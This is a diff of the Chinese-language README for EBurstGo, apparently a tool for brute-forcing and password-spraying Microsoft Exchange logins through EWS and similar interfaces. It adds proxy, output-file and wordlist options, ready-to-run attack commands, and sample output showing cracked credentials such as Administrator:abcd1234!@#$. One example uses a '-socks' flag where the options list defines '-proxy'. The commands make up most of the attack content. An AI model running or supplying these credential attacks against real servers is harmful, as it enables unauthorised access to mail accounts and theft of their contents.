@@ -35,20 +35,29 @@ Usage of ./EBurstGo:
     	指定 Exchange Web 接口
   -nocolor
     	关闭输出颜色
+  -nosave
+    	不将结果输出至文件
+  -o string
+    	指定结果输出文件 (default "result.txt")
   -pass string
     	指定密码
   -passf string
     	密码字典
-  -thread int
+  -proxy string
+    	指定 socks/http(s) 代理
+  -t int
     	协程数量 (default 2)
   -url string
     	Exchange 服务器地址
   -user string
     	指定用户名
+  -user-as-pass
+    	指定密码与用户名相同
   -userf string
     	用户名字典
-  -verbose
-    	显示详细信息
+  -userpassf string
+    	指定用户名密码字典 (user:pass)
+  -v	显示详细信息
 ```
 
 check
@@ -69,10 +78,34 @@ $ ./EBurstGo -url https://192.168.30.11 -check
 
 brute
 
+默认会将爆破成功的账户追加写入 result.txt
+
+```shell
+# 常规爆破
+./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews
+
+# 指定用户名
+./EBurstGo -url https://192.168.30.11 -domain hack-my.com -user Alice -passf pass.txt -mode ews
+
+# 密码喷洒
+./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -pass 'Changeme123' -mode ews
+
+# 支持 user:pass 格式的字典
+./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userpassf userpass.txt -mode ews
+
+# 密码与用户名相同
+./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -user-as-pass -mode ews
+
+# 设置 socks/http(s) 代理
+./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews -socks socks5://127.0.0.1:1080
+```
+
+examples
+
 ```shell
 $ ./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews
-[*] 使用 ews 接口爆破: https://192.168.30.11
 [*] 用户名:7 密码:9 共计:63
+[*] 使用 ews 接口爆破: https://192.168.30.11
 [+] 成功: Administrator:abcd1234!@#$
 [+] 成功: Alice:Alice123!
 [+] 成功: Bob:Bob123!
@@ -80,6 +113,7 @@ $ ./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -pas
 [*] 耗时: 3.031753209s
 ```
 
-todo
-- 开启代理爆破一段时间会出现 `connection refused`, 待解决
+## Todo
+
+- 开启代理使用 NTLM 认证爆破一段时间后出现 `connection refused`, 待解决
 - `/powershell` 接口 (Kerberos 认证) 待支持
